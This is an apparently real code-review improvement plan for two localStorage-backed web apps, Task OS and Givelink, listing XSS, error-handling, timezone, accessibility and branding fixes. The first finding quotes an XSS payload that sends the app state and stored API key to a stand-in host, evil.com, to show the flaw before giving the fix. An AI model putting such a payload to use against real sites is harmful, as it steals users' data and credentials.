# Givelink / Task OS — Improvement Plan

_Reviewed 2026-05-09 against index.html (4,685 lines) and givelink.html (1,716 lines). No external dependencies; vanilla JS, localStorage-backed, Vercel-deployed PWA._

---

## 🔥 P0 — Ship this week (bugs breaking user flows)

### 1. XSS via unescaped user input in innerHTML

**What:** Task titles, goal titles, and relationship names are interpolated raw into `innerHTML`; a crafted title like `<img src=x onerror="fetch('https://evil.com?k='+localStorage.getItem('taskos'))">` exfiltrates the entire app state including the Claude API key.

**Where:**
- `index.html:1191` — `renderTop3`: `${t.title}` in onclick container
- `index.html:1380, 1383, 1387, 1389` — `renderWizPanel`: `${t.title}`, `${g.title}` in all five wizard steps
- `index.html:1172` — `renderDash`: dash-week task list
- `index.html:4099–4105` — `_renderAIBriefing`: AI-returned `d.PRIORITY_1` placed in `innerHTML`

**Why it matters:** The CSP (`vercel.json:14`) allows `'unsafe-inline'` in `script-src`, which means attribute event handlers injected via `innerHTML` execute. An API key stored in localStorage is exfiltrated with a single malicious task title. This is user data destruction, not a theoretical risk.

**Effort:** M

**Suggested fix:**
- Apply the existing `esc()` function (defined at `index.html:4174`) to every user-supplied string before it enters `innerHTML`: `${esc(t.title)}`, `${esc(g.title)}`.
- For onclick attribute values using `t.id`, no change needed — `uid()` produces safe hex UUIDs.
- Consider tightening the CSP to remove `'unsafe-inline'` long-term and use a nonce strategy.

---

### 2. `callClaude()` silently swallows HTTP errors — users get no actionable feedback

**What:** The Claude API fetch does not check `res.ok` before calling `res.json()`. A `401` (invalid key), `429` (rate limit), or `500` response is silently treated as a null result; the user sees a generic "AI error" toast (or nothing at all for the morning briefing) with no way to diagnose the problem.

**Where:** `index.html:2220–2222`
```js
const data=await res.json();
return data.content?.[0]?.text||null;
// No res.ok check; 401/429/500 bodies have no .content field → silently null
```

**Why it matters:** Users who enter a wrong API key or hit Anthropic's rate limit can't tell whether the feature is broken or their key is bad. Support burden and churn from unexplained AI failures.

**Effort:** S

**Suggested fix:**
- Add `if(!res.ok){const err=await res.json().catch(()=>({}));toast('AI error '+res.status+': '+(err?.error?.message||res.statusText));return null;}` after the fetch.
- For 429, show "Rate limit hit — wait a minute" specifically.
- Mirror this fix in `callClaudeGL` in `givelink.html` (~line 1520).

---

### 3. Multiple rapid AI clicks fire redundant API calls — no in-flight guard

**What:** There is no lock preventing a user from clicking "Generate AI Challenge", "Auto-Fill Review", or the Givelink outreach button multiple times. Each click fires an independent API call, returning overlapping results and wasting API credits.

**Where:**
- `index.html:3060` — `genAIChallenge()`
- `index.html` — `generateTweet()` (around line 2769)
- `givelink.html:1561` — `openOutreachGenerator()` / subsequent generate calls

**Why it matters:** Accidental double-clicks (especially on mobile) cost money and can write duplicate entries to state. For the AI outreach email, two in-flight calls can race and write conflicting drafts.

**Effort:** S

**Suggested fix:**
- Add a module-level `let _aiInFlight=false;` guard. Set to `true` at the start of each async AI function, reset in `finally`. Disable (or visually dim) the trigger button while in-flight.
- Example: `if(_aiInFlight)return; _aiInFlight=true; try{...}finally{_aiInFlight=false;}`.

---

## ⚡ P1 — High ROI (UX friction blocking conversion)

### 4. UTC date strings break streaks and habit tracking for non-UTC users

**What:** `new Date().toISOString().slice(0,10)` returns the UTC calendar date. A user in UTC+10 logging a habit at 11 PM gets the next UTC day — their streak breaks even though they logged on time by their local clock.

**Where:**
- `index.html:2235, 3054, 3072, 4110, 4062` — health, challenge, ritual, briefing date keys
- `givelink.html` — sprint date calculations throughout

**Why it matters:** The streak/habit systems are core motivation mechanics. A user in Sydney or Tokyo who reliably logs daily habits will still see their streak break every few days. This quietly destroys trust in the app's data accuracy.

**Effort:** S

**Suggested fix:**
- Replace all `new Date().toISOString().slice(0,10)` with a single helper added near the top of each file:
  ```js
  function localDate(){const d=new Date();return d.getFullYear()+'-'+String(d.getMonth()+1).padStart(2,'0')+'-'+String(d.getDate()).padStart(2,'0');}
  ```
- Find and replace (≈12 occurrences in index.html, ≈6 in givelink.html).

---

### 5. Morning AI briefing loads silently — no spinner, no failure message

**What:** When the morning briefing AI call is in flight, the card shows yesterday's static bullet points with no indication that an update is loading. If the call fails (bad key, network, rate limit), the user never knows — the card silently stays on the cached version.

**Where:** `index.html:4068–4095` — `_fetchAIBriefing()`; compare with the inbox AI at `4130` which correctly shows "⏳ Analyzing…"

**Why it matters:** The first thing users see each morning is the briefing. A silent, stale card reads as a broken feature and trains users to distrust the AI coaching layer.

**Effort:** S

**Suggested fix:**
- Before the `callClaude` call, set `body.innerHTML = '⏳ Loading today\'s AI briefing…'`.
- If `!text` (null result), set `body.innerHTML = '⚠️ AI briefing unavailable. Check your API key in Settings.'`.
- This matches the pattern already used in `openStandup()` at `givelink.html:1447`.

---

### 6. Hardcoded model `claude-haiku-4-5-20251001` will silently break on deprecation

**What:** The Claude model name is hardcoded in two places. When Anthropic retires this model ID, all AI features across both apps stop working; the API returns a `404` error, which (given bug #2) the user sees only as "AI error".

**Where:**
- `index.html:2219`
- `givelink.html:1621`

**Why it matters:** Every AI feature in the product — briefing, challenge, inbox triage, outreach email, standup — goes dark simultaneously with zero warning. Discovery time: whenever a user next tries to use AI.

**Effort:** S

**Suggested fix:**
- Extract to a top-of-file constant in each file: `const AI_MODEL='claude-haiku-4-5-20251001';`
- Pass through `callClaude(prompt, tokens, AI_MODEL)` so there is a single place to update.
- Consider using the `claude-haiku-4-5` alias without the datestamp suffix if Anthropic supports it (check their latest model docs).

---

### 7. `window.prompt()` for CRM activity logging breaks app design language

**What:** Logging an activity on a nonprofit org in Givelink's CRM opens a native browser `window.prompt()` dialog — unstyled, single-line only, can't be dismissed by Escape in some browsers, and looks completely alien in the app.

**Where:** `givelink.html:1392` — `logActivityNP()`

**Why it matters:** CRM activity logging is a core daily action in Givelink. The jarring native dialog creates friction exactly at the moment of recording pipeline progress, and it prevents multi-line notes.

**Effort:** M

**Suggested fix:**
- Add a small inline modal (matching the existing `.mo`/`.md` pattern) with a `<textarea>` for the activity note, a date field, and Save/Cancel buttons.
- This also allows the note to be pre-populated for editing, which the current `prompt()` approach can't do.

---

### 8. Modal dialogs lack ARIA roles and focus trapping

**What:** All 20+ modals in the app use a `.mo` div with `display:flex/none` toggling but have no `role="dialog"`, `aria-modal="true"`, or `aria-labelledby`. Focus is not trapped inside the modal when open — Tab key escapes to background content.

**Where:** `index.html:94–98` (`.mo` class definition applied to all modals); `index.html:745` (Settings modal as a concrete example)

**Why it matters:** WCAG 2.1 Level AA failure. Screen reader users can't identify that a dialog is open. Keyboard users tabbing through the settings modal will exit into the background page. As Givelink pitches to nonprofits (often with accessibility requirements), this is a sales risk.

**Effort:** M

**Suggested fix:**
- Add `role="dialog"` and `aria-modal="true"` to each `.md` inner div; add `aria-labelledby` pointing to the `<h3>` inside `.mh`.
- Write a 10-line `trapFocus(modalEl)` helper that listens for Tab/Shift-Tab and cycles focus within the modal. Call it from `openM()` / `closeM()`.
- Add `aria-hidden="true"` to the main content behind an open modal.

---

### 9. Brand palette mismatch: both apps use blue; brand spec is purple/pink

**What:** Task OS uses `--accent:#58a6ff` (GitHub blue); Givelink uses `--accent:#3b82f6` (Tailwind blue). The brand spec calls for purple (`#5718CA`/`#6B3FA0`) and pink (`#C2185B`/`#E353B6`) as primary and secondary.

**Where:**
- `index.html:17` — `:root` `--accent` definition
- `givelink.html:17` — `:root` `--accent` definition
- `manifest.json` — `theme_color: #58a6ff`
- `manifest-givelink.json` — no `theme_color` set

**Why it matters:** Every CTA button, active nav item, focus ring, and progress bar in both apps shows blue. Marketing material, the Givelink logo (`icon-gl.svg`), and any external brand materials using purple/pink create a jarring inconsistency that undermines brand recognition at first launch.

**Effort:** M

**Suggested fix:**
- Update `--accent` to `#5718CA` in both files (check text-on-accent contrast — white `#fff` on `#5718CA` passes AA at ~7:1).
- Introduce `--accent-secondary:#E353B6` for hover/highlight states; verify it is never placed directly on the primary purple background (no-pink-on-purple rule).
- Update `theme_color` in both manifests and both `<meta name="theme-color">` tags.

---

## 🛠 P2 — Code health (tech debt slowing velocity)

### 10. `esc()` sanitizer defined once but not applied to existing render functions

**What:** The `esc()` HTML-escaping function was added at `index.html:4174` when the inbox AI was built and is correctly used in the inbox triage renderer. None of the earlier render functions (`renderTop3`, `renderWizPanel`, `renderDash`, `renderAll`, etc.) were updated to use it.

**Where:** `index.html:4174` (definition); missing from ~100+ prior `innerHTML` construction sites

**Why it matters:** This creates a false sense of security — the function exists, so future code might assume all innerHTML is already safe. It also means the XSS fix in P0/item #1 requires a grep-and-patch of ~15 render functions, not a single-line change.

**Effort:** M

**Suggested fix:**
- Add an ESLint-style comment convention (`// SAFE: esc() applied`) to innerHTML lines where escaping has been verified.
- Run `grep -n 'innerHTML=' index.html | wc -l` to track progress (currently ~152 lines); target is every user-data interpolation using `esc()` or switching to `element.textContent =`.

---

### 11. Service worker cache version is a hardcoded timestamp — stale cache on every deploy

**What:** `sw.js:1` has `const CACHE = 'task-os-20260419-190847'`. This must be manually updated before every deploy. If forgotten, users receive the old cached HTML indefinitely even after a Vercel redeploy.

**Where:** `sw.js:1`

**Why it matters:** A missed cache bump means users on the stale app can't benefit from bug fixes — including P0 security fixes. Since there's no CI/build step, this is a manual risk that scales with deploy frequency.

**Effort:** S

**Suggested fix:**
- Short-term: add a prominent comment `// ⚠️ BUMP THIS ON EVERY DEPLOY` with an ISO date stamp schema.
- Medium-term: generate the cache key at runtime from the HTML file's `ETag` or `Last-Modified` header via a fetch at service worker install time, removing the manual step entirely.

---

### 12. AI response format not validated before writing to app state

**What:** AI responses from briefing, challenge, and standup generators are parsed via `line.match(/^(\w+): (.+)/)` or similar regex. If Claude returns unexpected output (preamble text, markdown fences, partial response), the regex silently yields empty strings that get persisted to `S`.

**Where:**
- `index.html:4092–4093` — briefing parser
- `index.html:3069–3070` — challenge parser (`getLine()` helper)
- `givelink.html:~1480` — standup parser

**Why it matters:** Silent bad data is worse than no data. An empty challenge title gets saved and displayed; an empty commitment gets logged. The user can't tell whether AI failed or responded with nothing.

**Effort:** S

**Suggested fix:**
- Before saving parsed results, check that required fields are non-empty strings: `if(!title||title.length<3){toast('AI returned unexpected format — try again');return;}`.
- Log the raw AI response to `console.warn` (not `console.log`) so it's visible in DevTools but not noisy in production.

---

### 13. Missing empty states for Health, Decisions, and Relationships views

**What:** When a user has no health logs, no decisions, or no relationships added, the corresponding view renders a blank container with no guidance, no CTA, and no illustration.

**Where:**
- `index.html:772` — `#health-stats` renders nothing when `S.healthLogs` is empty
- `index.html` — `renderDecisions()` (around line 3870) renders an empty list
- `index.html` — `renderRelationships()` (around line 3520) same pattern

**Why it matters:** New users (or users on a fresh install) see a blank screen that looks broken. Empty states are the highest-leverage onboarding moment — a single "Log your first workout →" button converts blank→engaged.

**Effort:** S

**Suggested fix:**
- Each render function: if the backing collection is empty, set the container's `innerHTML` to an empty state card (icon, one-line explainer, single CTA button calling the relevant `open*()` function).
- Reuse the pattern already in `renderDash` at `index.html:1172`: `'<div class="empty">No tasks this week. <span ...>Add some →</span></div>'`.

---

### 14. `alert()` used for form validation errors — blocks UI thread and breaks visual consistency

**What:** Two validation paths use native `alert()` instead of the app's own `toast()` system: empty task title and Top 3 slot full.

**Where:**
- `index.html:1506` — `alert('Enter a task title.')`
- `index.html:1530` — `alert('Top 3 full! Remove one first.')`

**Why it matters:** `alert()` blocks the browser's rendering thread until dismissed, can't be styled, and looks like an OS dialog in a polished PWA. Every time it appears it breaks the immersion and signals "this was an afterthought."

**Effort:** S

**Suggested fix:**
- Replace both with `toast('...')` calls — the function already exists and accepts a message string.
- For the task title case, also set focus back to `#t-title` after the toast so users can immediately type.

---

## 💡 P3 — Nice to have

### 15. Data reset offers no export before wiping

**What:** The Settings modal's "Reset Data" button (`index.html:756`) destroys all localStorage data with a single `confirm()` dialog. There is no "export first" path.

**Where:** `index.html:756`

**Why it matters:** A misclick or accidental confirmation permanently destroys all tasks, goals, habits, finance logs, and health data. No recovery path exists (no server-side backup, no export prompt).

**Effort:** S

**Suggested fix:**
- Add an "Export JSON" button that calls `JSON.stringify(S)` and triggers a file download before the reset confirm is shown, or add a two-step "Export & Reset" button as the primary CTA.

---

### 16. Sidebar navigation items are `<div>` elements — invisible to keyboard and screen-reader users

**What:** All sidebar nav items use `.ni` CSS class on `<div>` elements with `onclick` handlers. Tab key skips them entirely; screen readers don't announce them as interactive.

**Where:** `index.html:28–30` (`.ni` CSS rule); every `<div class="ni" onclick="nav('...')">` in the sidebar

**Why it matters:** The entire app is unreachable without a mouse for keyboard-only users. All sidebar navigation items — Tasks, Goals, Health, Finance, Habits — are inaccessible.

**Effort:** S

**Suggested fix:**
- Change `.ni` divs to `<button class="ni">` elements (button reset already provided by `border:none` etc.) OR add `tabindex="0" role="button"` and handle `keydown` Enter/Space on each.
- The CSS changes are minimal: add `background:none; text-align:left; width:100%;` to the `.ni` button reset.

---

### 17. No cross-tab localStorage synchronization — concurrent tabs silently overwrite each other

**What:** Opening Task OS in two tabs and saving in both causes the second save to silently overwrite the first. The `storage` browser event, which fires when another tab writes to localStorage, is never listened to.

**Where:** `index.html` — no `window.addEventListener('storage', ...)` anywhere

**Why it matters:** Power users who keep the app open across tabs (common on desktop) will silently lose work. Tasks added in one tab disappear when the other tab saves.

**Effort:** M

**Suggested fix:**
- Add `window.addEventListener('storage', e=>{if(e.key==='taskos'&&e.newValue){S=JSON.parse(e.newValue);refresh();}});` near the `load()` call.
- Show a non-blocking toast "Synced from another tab" so users understand why the UI updated.

---

### 18. PWA theme color is blue in both manifests — browser chrome doesn't reflect brand

**What:** The `<meta name="theme-color">` and `manifest.json` `theme_color` show `#58a6ff` (Task OS) or are absent (Givelink manifest). This is the color of the browser address bar and task switcher thumbnail on Android.

**Where:** `index.html:6`, `manifest.json` (no `theme_color` field), `manifest-givelink.json` (no `theme_color` field)

**Why it matters:** The first visual impression of the installed PWA is a blue browser chrome. After the accent color is updated to brand purple (P1/item #9), this will look inconsistent until the manifests are updated.

**Effort:** S

**Suggested fix:**
- Set `theme_color: "#5718CA"` in both manifests.
- Update `<meta name="theme-color" content="#5718CA">` in both HTML files.
- Do this after/alongside item #9 so both changes go live together.

---

### 19. Deep work timer ends silently — no notification when session completes

**What:** The deep work session countdown timer reaches zero with no audio, no browser notification, and no visual flash. Users must watch the screen to know when to stop.

**Where:** `index.html` — deep work timer implementation (around the `.dw-timer` CSS section)

**Why it matters:** Deep work sessions are deliberately focused — users often look away from the screen. A silent timer end means sessions either run over or users interrupt their focus to check the clock, defeating the purpose.

**Effort:** S

**Suggested fix:**
- On timer end, call `new Notification('⏱ Deep work session complete!', {body: 'Take a break.'})` (request permission on first session start).
- As a fallback (if notifications denied), play a short audio tone via `AudioContext` — a 0.1s 440Hz beep adds two lines of code.

---

### 20. `confirm()` dialogs used for destructive actions — inconsistent with app design

**What:** Deleting a task (`index.html:1513`), and deleting a nonprofit in Givelink CRM (`givelink.html:1386`), use `window.confirm()`. Like `alert()`, these are native OS dialogs with no styling, no undo path, and no ability to show context about what will be deleted.

**Where:**
- `index.html:1513` — `delTask()`
- `givelink.html:1386` — `deleteNP()`

**Why it matters:** Accidental CRM org deletion is not recoverable. A styled inline confirmation that shows the org name ("Delete St. Anthony Foundation?") gives users context and reduces mis-clicks compared to a bare "Delete this org?" browser dialog.

**Effort:** S

**Suggested fix:**
- For task deletion: `toast()` with an "Undo" button that restores the task within 5 seconds (push to a `_trashBin` array, clear on timeout).
- For CRM org deletion: show a modal confirmation that displays the org name, with a red "Delete [Name]" button and a Cancel button.
